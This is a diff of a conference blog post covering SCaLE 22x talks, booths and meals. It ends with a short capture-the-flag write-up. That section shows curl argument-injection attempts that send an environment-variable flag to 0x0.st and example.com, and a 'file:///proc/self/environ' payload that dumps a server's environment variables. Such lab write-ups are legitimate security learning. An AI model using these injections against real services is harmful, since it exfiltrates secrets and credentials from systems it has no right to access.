@@ -1,5 +1,5 @@
 ---
-title: "SCaLE 22x, Day 1 and 2"
+title: "SCaLE 22x, Day 1, 2 and 3"
 description: ""
 date: "2025-3-25"
 categories: [blog]
@@ -25,6 +25,82 @@ The big things I am excited for is:
 
 I went to the first meeting, and was immediately introduced to an interesting software — [genestack](https://docs.rackspacecloud.com/genestack-components/). Unlike openstack helm, it doesn't seem to *require* rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn't like being deployed on a single node.
 
+## Kubernetes as a Geographically Distributed System
+
+<https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system>
+
+This presentation is about StarlingX, which is noted below. It's a very interesting piece of software.
+
+StarlingX:
+
+* Started 7 years ago
+* Built for "edge computing"
+* All of the system services and components are deployed in containers
+* Sees heavy use in the telecommunications sectors
+
+More discussion of Kata-Containers, it seems that they use it for security at the edge. It can also be used for multi-tenancy.
+
+Deployment models:
+
+* One/two server models
+* Ceph for storage, can use ceph on one node deployments
+    * Can use external ceph for larger deployments
+* Control, storage, and worker nodes
+* AIO (all in one) simplex:
+    * No high availability or redundancy
+* AIO Duplex: Two nodes, so if one fails the setup stays up
+* Standard: Two controller nodes (with storage) and then a worker/compute node
+* Some nodes can be used as storage nodes regardless
+
+Distributed Cloud:
+
+* INtroduced in 3.0
+* Hetegenerous kubernetes/openstack environment
+* Central cloud, a controller cloud
+    * Horizon dashboard, docker registry, keystone
+* Remote, geographically dispered edge clouds
+    * They are semi-autonomous, meaning they work without network
+* Distributed control plane
+
+Resiliencey/Geo redundancy
+
+* If a natural disaster/etc happens, the system doesn't go down
+* If one cluster goes down, the system stays up
+
+Management:
+
+* Tools to configure pxeboot, lifecycle, health and sensors
+* Monitoring of stuff
+* BMC/IPMI management things
+* Service management, configures high availability profiles
+* Auto update software, and/or add more functionality
+    * Rolling updates
+
+StarlingX is used heavily in the Telecom segments:
+
+* They require 5 9's of uptime. They require less than 5 minutes of downtime for a whole **YEAR** of uptime.
+
+New things in 10.0:
+
+* Ipv4/v6 dual stack
+* Kata containers support
+* Managing up to 5,000 sites per system controler
+* Unified software management
+* Switch between standard and/or low latency kernel at runtime
+    * Low latency sounds cool but has higher resource usage and resource needs. Presenter suggests sticking with standards unless you require specific things.
+
+Telecom deployment things:
+
+* StarlingX is used in 5G deployments?!
+    * "Highly Utilized"
+    * Small footprint. 
+* Precision time protocol
+
+Smallest deployment needs 1 cpu core.
+
+<https://starlingx.io/blog>
+
+
 Interesting software/product list:
 
 * [Genestack](https://github.com/rackerlabs/genestack) — Openstack on/alongside K8s.
@@ -32,7 +108,7 @@ Interesting software/product list:
 * [Kata-containers](https://github.com/kata-containers/kata-containers/) — Container runtime that uses a virtual machine for more security/isolation
     * Similar project mentioned: Confidential containers
 * [StarlingX](https://www.starlingx.io/)
-    * Linux, Debian, Kubernetes, Openstack, seems to be a Linux distro, they offer an ISO.
+    * Linux, Debian, Kubernetes, Openstack (on kubernetes), seems to be a Linux distro, they offer an ISO.
     * "Enhanced Networking" — ipv6, dual stack support, now available
 * [vJailbreak](https://github.com/platform9/vjailbreak) — automatic migrations from vmware to openstack.
     * Doesn't appear to be live, minimal downtime
@@ -322,16 +398,214 @@ Fixes:
 
 So apparently, DevopsDay LA has a regular meetup, every two months, on Thursday in Santa Monica.
 
-Interesting software/products:
-* <https://runme.dev> — Interactive markdown notebooks for devops
-
 ![](images/thankyoudevopsers.jpg)
 
-This is funny, but it should be noted that DevOps as a career as a lot of remote jobs. 
+This is funny, but it should be noted that DevOps as a career has many remote jobs, which is what this may be referencing.
+
+Interesting software/products:
+
+* <https://runme.dev> — Interactive markdown notebooks for devops
+
+# Scale Presentations
+
+## A simpler and faster firewall with bpfilter
+
+<https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter>
+
+<https://naccy.de/2024/10/01/bpfilter-status-report.html> — blog post by the presenter from last eyar
+
+Linux Firewalls:
+
+* Iptables: Rules are shaped as C structures
+    * See my notes on the problems with iptables from the other talk "Kubernetes and the Dragons in Linux Kernel vs. Userspace Tools"
+    * Not very performant, after 512 rules, performance goes down immensely
+* Nftables: Performance drops off after 128 rules, before iptables does
+* BPF: Much more performant, can also do things like calling a program along with the packet. 
+    * You must write C code, that works for a specific version of an unstable API
+    * Faster than iptables or nftables
+* BPFilter firewall
+    * performance drops off at 1024
+
+You can make the firewalls faster using "sets"
+
+* No performance dropoff after a certain amount of rulesets
+* Works on nftables and bpfilter
+
+Audience member: Have you done a comparison between bpfilter and "nftables offload" where it runs on the NIC itself? But bpfilter seems to also be able to offload.
+
+3 main components:
+
+* bfcli, libbpfilter, bpfilter
+* Much more usable cli
+
+Chain architecture:
+
+* Chain is similar to a chain in iptables or a table in nftables
+* In the chain there are rules, and the rules have an action
+* Can decide to do normal firewall things, like drop packets
+
+Bytecode Factory:
+
+* Bpfilter creates BPF programs
+* Similar to event driven programming
+* Runtime context of the program disappears when it returns, so you have to make "maps to save data"
+* All the bytecode runs in the kernelspace
+* BPF verifier will check that BPF code is valid
+
+Demo:
+
+* He runs iptables-legacy and then adjusts some rules
+* Then uses bpfilter to change some rules and drop some backets
+* The bpfilters daemon can be "closed", and then it will stop accepting connections. However, the program is still running.
+* He shows the bpfilter config setup. It's... okay. But it's simialr in complexity (and power), as iptables. For usage by a homelabber or other inexperienced user it would need to be abstracted by another layer like how firewalld and ufw abstract ip/nftables.
+* Bpfilter also have sets, he shows us a set of ip's in the config file
+
+<https://bpfilter.io>
+
+BPFilter roadmap: <https://github.com/orgs/facebook/projects/50>
+
+RPM package available in fedora. But the presenter reccommends building it yourself.
+
+Questions (more like answers):
+
+* I am not satisfied with the answer to my question: What if there are multiple bpclients on the system configuring a single bpfilter daemon
+    * But it seems to be better architectured and dodges some of the issues
+* It can be used alongside nftables for features that it lacks
 
 
+## Affording your AI chatbot friends
 
-# Notes from Friends
+<https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends>
+
+What if your boss insists that you need AI?
+
+* But what does AI mean?
+* What even are you supposed to deploy?
+* Buy or build? Moving parts? What infra? What is an "AI agent"? Is this expensive?...
+
+AI agent:
+
+* Model that has access to tools, e.g escalating tickets, running sql queries, or 
+* Think square peg, round hole?
+
+Moving parts of AI:
+
+* Models: Big balls of floating point numbers that take input, turn tokens into embeddedings, do CUDA magic, and then spit out more tokens
+    * Try llama models to start. Deepseek, or OpenAI
+* Inference engine: Thing that runs the models
+    * llama.cpp, or the python things
+    * This is the part that needs the GPU to run, the pricy part
+* Your code:
+    * Sits in the middle, wraps 
+    * Most diverse and opinionated
+* UI
+    * sparkly part
+
+"Excessive acronym compliance" lmao
+
+Model provider methods:
+
+* Relying on OpenAI means you rely on them to keep your business afloat. 
+    * Most providers sell at a loss to get adoption
+    * They have replaced snapshots off models with differenent models. Xe had an issue where a new snapshot of chatgpt turned their chatbot fro happy to depressed `:(`.
+    * Deprecations become emergency.
+* Self hosting
+    * Big models are truly massive. "Big data is bigger than most people's laptop ram".
+    * You own the stack, and can choose models or the deprecation schedule.
+    * A lot more freedom and control
+    * No data is sent to third parties. "This can be very important in acronym compliance".
+
+Downsides to self hosting:
+
+* Nvidia drivers... `:(`. "They will never fall over work hours".
+    * Can be worked around with reduancy, but there are tradeoffs.
+* You have to choose the models. Choice paralysis.
+* Must be opinionated about ollama vs llama.cpp or the other options.
+    * Must do research and develop opinions, which costs time.
+* You need GPU's by Nvidia.
+    * "I can't stop you from hurting yourself" — when referring to AMD or apple silicon options
+    * Nvidia GPU's are the easiest, but extremely pricy, and also have a big wait time.
+    * Service life of one to three years.
+
+Middle path, Nomadic Compute:
+
+* "Nomadic Compute" — new buzzword by Xe Iaso
+* Cheating by your setup hunting down the best deal from providers.
+* All cloud providers have GPU's. Xe said they saw small clouds on lowendbox advertising GPU setups.
+* GPU's you only need model year, video memory, and memory bandwidth. Nothing else matters.
+* Older cards can be used for AI workflows, but the price per hour goes down.
+
+Skypilot:
+
+* Abstraction layer for infrastructure as a service
+* Give it a bunch of API keys
+* It will figure out the best deal and then switch
+* It will also autoscale up and down
+
+Advice:
+
+* Build on top of boring tools. Don't waste your "innovation budget".
+    * E.g. Postgres. Object storage. Wireguard in userspace.
+* Treat it like a database.
+* Scale things down when not in use, in order to save money.
+* Cheat by putting your model weights directly into the docker image.
+    * If the image contains the weights, many platforms won't charge you for the pull time
+* Wireguard can be ran in userspace, which is useful for joining machines to eachothers network.
+
+Xe started wanting to self host everything, but reality got in the way.
+
+Example Project, Mimi, an AI chatbot that gets images from discord:
+
+* Used to be entirely self hosted across 3 nodes
+    * Homelab server has 12 GB of vram
+* Meta releases llama3, which requires 48 GB of vram.
+* But now runs on a cloud architecture
+    * 5 dollars (canadia money?) per month for Mimi's cloud features
+* Filter model still runs on self hosted.
+
+"It's okay to use the cloud, just have an exit strategy"
+
+<https://opensource.org/ai/open-weights>
+
+<https://fal.ai/> — Flux image generator as a service, where you pay per image. Much cheaper than running Flux locally, but is not a locked in setup.
+
+Every input matters:
+
+* Claude gets lazy around august, Chatgpt gets really bad around december. Dates of chat have an effect on the LLM output.
+* The seed value can be set so that it's deterministic
+    * "seed 3407 is all your need"
+* Set the temperature (randomness of output) as low as possible when trying to do something deterministic.
+* If an app doesn't need an input, don't give it to an LLM.
+
+Filter models:
+
+* Sits in the middle of the AI flow, and checks the user input to ensure it is safe. 
+* Also can sanitize
+* Prevents  
+* Two most popular are: llamaguard (Xe stated llamaguard3-8b is good despite being small, because it is finetuned) from facebook, and shieldguard from google.
+* One time Mimi decided that *everything* was "Election Interference"
+
+<https://openrouter.ai/>
+
+Quantization: lossy compression to make the AI models smaller. The loss is minimal, but neglible.
+
+Relevant Blogpost: <https://www.tigrisdata.com/blog/ai-chatbot-friends/>
+
+# Scale Next Generation
+
+They had a great deal of stuff set up for the next generation of Linux users, middle and high schoolers. I thought it was really cool, and since I like teaching, one of the organizers suggested that I hit them up and volunteer
+
+They had multiple machines with the microbits, $20 little pi-like devices that can run python, for teaching python programming.
+
+![](images/microbitnextgen.jpg)
+
+They also had an array of books on Linux and software things:
+
+![](images/nextgenbooks.jpg)
+
+It was pretty neat.
+
+# Notes from Friends and other Misc Notes
 
 Nix can become nigthmarish to update on Mac OS, due to the system level changes that Mac makes: <https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3>. 
 
@@ -365,6 +639,17 @@ Hackathons sometimes involve shark tank style pitches.
 
 ID tech teaching platform
 
+Georgia Tech Research Institute is always hiring. 
+
+Oracle Linux has a one/two click VM that runs: <https://xeiaso.net/notes/2025/k8s-dev-mac-oracle-linux/>
+
+Onepassword has a nice kubernetes operator.
+
+Git forges are especially vulnerable to AI scrapers, since they have so many links and commit history saved. Xe Iaso's proof of work captcha led to a 90% reduction on Gnome's gitlab. If you return http 200 and at least 4 kilobytes of html, scrapers will give up. <https://xeiaso.net/blog/2025/anubis/>
+
+Open Compute project.
+
+
 # Job Board
 
 There is a literal job baord at SCaLE, a literal whiteboard where companies mention they are hiring or people state that they are looking for a job.
@@ -378,16 +663,65 @@ There is a literal job baord at SCaLE, a literal whiteboard where companies ment
 
 There was some fun stuff in the exhibition hall.
 
-There was lots of ARM stuff.
+There was a bunch of this new Arm system76 desktop, which they displayed at their booth:
+
+![](images/system76.jpg)
+
+But it was also at the Arm booth:
+
+![](images/armbooth.jpg)
+
+And the Nixos booth (they were using it as a build server/cache on Thursday/Friday in the other conference building and today)
+
+![](images/nixosampere.jpg)
+
+And the Alma Linux booth also had one of these devices:
+
+![](images/almaampere.jpg)
+
+I learned at that booth that apparently, Ovirt is being built and tested against Alma Linux now.
+
+There was other Arm stuff, like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall. This was from the Meta/Facebook table.
 
 ![](images/macminiarm.jpg)
 
-Like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall.
 
+I learned at the Sofware Freedomm Conservancy booth that they sponsored the event, and all of the routers in the event run the fully free software openwrt operating system.
+
+![](images/router1.jpg)
+
+![](images/router2.jpg)
+
+
+WRCCDC had a booth as well:
+
+![](images/wrccdc.jpg)
+
+A really interesting booth was the Mentors in Tech (MINT) booth.
+
+![](images/mentorsintech.jpg)
+
+They run a mentorship program for students.
+
+Meetups I just learned about (Or haven't gone to yet):
+
+* Datacon LA, a 1 day conference in la
+* <https://issasocal.org>
+    * Information systems security association
+    * Semi-regular meetups in LA
+* Owasp
+    * Last wednesday of every month
+    * Can RSVP on Linkedin
+* Information technology disaster resource center
+    * They volunteer to set up IT infrastructure in disaster areas that need it
+    * <https://www.itdrc.org/>
+    * Require some trainings, and offer some free trainings on what is needed to do the job
 
 Interesting software/products/stuff:
 
 * <https://coder.dev>
+    * Self hosted deployment of online code workspaces
+    * They also seem to offer kasmvnc or rdp, in addition to vscode web version
 * FastX
     * Virtual Desktop Infrastructure offering Linux machines
     * educational licenses are cheaper, apparently all of cal state had a license
@@ -395,6 +729,87 @@ Interesting software/products/stuff:
     * Ieee acm curriculum for bachelors in computer science or comp engineering, but don't say what software or hardware, so you can pick
 * <https://www.codeday.org/>
     * Computing talent initiative, sign people up for this
+
+
+# CTF
+
+The CTF is the Pacific Hackers CTF. I might to a mini writeup here. 
+
+First, I try artist, the webdev program. It's url is at <https://artist.ctf.pacifichackers.com> I downloaded the source code they provided and saw this in the fake dockerfile:
+
+```{Dockerfile}
+ENV FLAG="FAKE_FLAG{FOR_TESTING}"
+```
+
+The code doesn't have the real flag. But based on this, I am guessing that the real flag is an environment variable injected into the docker container from however they are running it.
+
+In the flask code, it runs curl to get the background:
+
+```{.python}
+try:
+    result = subprocess.run(
+        ['curl', '-s', '-L', background],
+        capture_output=True,
+        shell=False
+    )
+```
+
+This is ultra sus. Also, I feel like setting the background of a simple drawing app shouldn't require or interact with the backdend.
+
+We need to make a command that uploads or publishes the environment variable. However, `shell=False` means we can't use "&&" or any bash-isms to get more commands.
+
+```{.default}
+[moonpie@osiris ~]$ curl -sL -F
+curl: option -F: requires parameter
+curl: try 'curl --help' for more information
+```
+
+Interesing. We can do -F, which uploads along with the thing.
+
+So if we do something like this: `-F "file=@-" https://0x0.st <<< "$FLAG"` and then it should upload our flag to 0x0.st.
+
+Pastebin. Doesn't seem to work. I threw up my own http server on my server. Maybe something like this? :
+
+```
+curl -d "key1=value1&key2=${ENV_VARIABLE}" http://example.com
+```
+
+This fails since python http server doesn't accept post. So I have gpt throw together something that does:
+
+```{.python}
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        print(f"Received data: {post_data}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Data received successfully")
+
+httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
+print("Server running on http://localhost:8000")
+httpd.serve_forever()
+```
+
+And then I run this. `curl -X POST -d "Hello, server!" http://localhost:8000` to send stuff.
+
+I still can't exploit the flask logic, however. Also, I don't know how to do a shell variable replacement from here. I think this is too complex. It seems that the logic returns a base64 encoded version of whatever the output is, so I'll just attempt to get curl to print the environment variable.
+
+`curl -w "Username: $TEST\n" http://example.com`
+
+Whoops, there is an easier way to do this, given to me by a friend:
+
+`file:///proc/self/environ`
+
+Just have that as the parameter, and then it outputs a base64 of all of the envirnoment variables.
+
+But there is a really interesting set of challenges, the [bashcrawl challenges](https://pacifichackers.com/challenges#Level%201), which are used to teach linux.
+
+* <https://github.com/mks22-dw/bashcrawl>
+* <https://mybinder.org/v2/gl/nthiery%2Fbashcrawl/HEAD>
+
 
 
 # Loot!
@@ -406,6 +821,7 @@ I got a lot:
 ![](images/loot_topview.jpg)
 
 I will do a detailed sorting and breakdown of what I got later.
+
 
 # Food Blog
 
@@ -443,3 +859,10 @@ I also got some of Tony's dark chocolate from the Arm booth:
 It was pretty good, 70% dark. It was hard to break pieces off so I could eat or share them though. I only ate half off it, and threw the rest away, it was a really big bar and I couldn't eat all of it.
 
 For dinner I had an extra one of the sandwiches mentioned above, which a friend had given to me and I saved it so I could eat it later.
+
+
+Day 3:
+
+For lunch, I went to the food place they had in the exhibition hall. I had a chicken sandwich, and fries, and it was actually pretty good. I forgot to take a picture `:(`. 
+
+For dinner, I went to El Cholo. I also forgot to take a picture, but I talked a ton with the nix people. It was also pretty good.
